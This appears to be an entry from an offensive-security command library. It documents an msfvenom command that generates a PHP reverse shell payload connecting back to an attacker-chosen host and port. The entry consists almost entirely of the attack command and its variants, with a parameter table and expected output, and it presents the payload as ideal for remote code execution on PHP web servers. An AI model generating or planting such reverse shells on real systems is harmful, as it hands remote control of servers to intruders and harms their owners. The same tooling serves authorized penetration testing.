---
data: msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=1234 > shell.php
tags:
  - payload-generation
  - rce
type: command
executor: bash
platforms:
  - Linux
  - Windows
id: 17d7df21-36fe-4ec6-99e2-3a5b6e88f990
created_at: '2025-12-14T17:24:08.447Z'
updated_at: '2025-12-14T17:24:08.447Z'
verified: false
validated: true
submitted: true
---
# msfvenom-php-reverse-shell

## Command

```bash
msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=1234 > shell.php
```

## Description

This command generates a PHP reverse shell payload using msfvenom, which creates a script that connects back to the specified LHOST and LPORT when executed, ideal for RCE in PHP-enabled web environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-p` | Specifies the payload type (php/reverse_php) | Yes |
| `LHOST` | Local host IP for the reverse connection (e.g., 192.168.1.1) | Yes |
| `LPORT` | Local port for the connection (e.g., 1234) | Yes |
| `>` | Redirects output to a file (shell.php) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 > shell.php
```

### Advanced Usage

```bash
msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=1234 -f raw > custom_shell.php
```

## Expected Output

The command produces no console output but writes PHP code to shell.php, including socket creation and command execution logic. Verify by checking file size (>0 bytes) and content for PHP tags.

## Related

- [[commands/nc-tcp-listener]]
- [[procedures/Generate-PHP-Reverse-Shell-Payload]]
